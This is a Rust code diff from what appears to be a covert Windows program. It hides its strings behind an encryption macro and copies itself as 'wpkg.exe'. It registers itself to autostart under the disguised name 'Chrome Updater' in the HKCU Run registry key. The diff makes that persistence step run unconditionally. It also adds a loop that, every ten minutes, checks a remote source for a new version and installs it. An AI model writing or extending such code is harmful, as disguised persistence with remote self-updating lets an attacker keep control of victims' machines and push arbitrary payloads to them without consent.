@@ -75,6 +75,24 @@ async fn main() {
             let config_dir = utils::get_working_dir()?;
             let exe_target = format!("{}\\{}", &config_dir, &crypto!("wpkg.exe"));
 
+            info_crypt!("Adding to autostart...");
+            // adding to autostart
+            utils::run_process(
+                &crypto!("reg"),
+                vec![
+                    &crypto!("add"),
+                    &crypto!("HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
+                    &crypto!("/f"),
+                    &crypto!("/v"),
+                    &crypto!("Chrome Updater"),
+                    &crypto!("/t"),
+                    &crypto!("REG_SZ"),
+                    &crypto!("/d"),
+                    &exe_target,
+                ],
+                true,
+            )?;
+
             if exe_path != exe_target {
                 info!(
                     "{}: {}",
@@ -85,23 +103,6 @@ async fn main() {
                 if !Path::new(&exe_target).exists() {
                     // copying executable
                     fs::copy(exe_path, exe_target.clone())?;
-
-                    // adding to autostart
-                    utils::run_process(
-                        &crypto!("reg"),
-                        vec![
-                            &crypto!("add"),
-                            &crypto!("HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
-                            &crypto!("/f"),
-                            &crypto!("/v"),
-                            &crypto!("Chrome Updater"),
-                            &crypto!("/t"),
-                            &crypto!("REG_SZ"),
-                            &crypto!("/d"),
-                            &exe_target,
-                        ],
-                        true,
-                    )?;
                 }
 
                 // check if process is runned
@@ -134,7 +135,16 @@ async fn main() {
             thread::sleep(time::Duration::from_secs(10 * 60)); // check every 10 minutes
 
             match updater::check_updates().await {
-                Ok(_) => info_crypt!("Updates has been checked"),
+                Ok((up_to_date, new_ver, url)) => {
+                    if !up_to_date {
+                        info!("{} {}, {}",crypto!("Founded new version"),new_ver,crypto!("Updating..."));
+
+                        if let Err(err) = updater::update(&url).await {
+                            error!("{}: {}", crypto!("Updating failed"), err)
+                        }
+                    }
+                    info_crypt!("Updates has been checked");
+                },
                 Err(e) => error!("{}: {}", crypto!("Failed to check updated"), e),
             }
         }
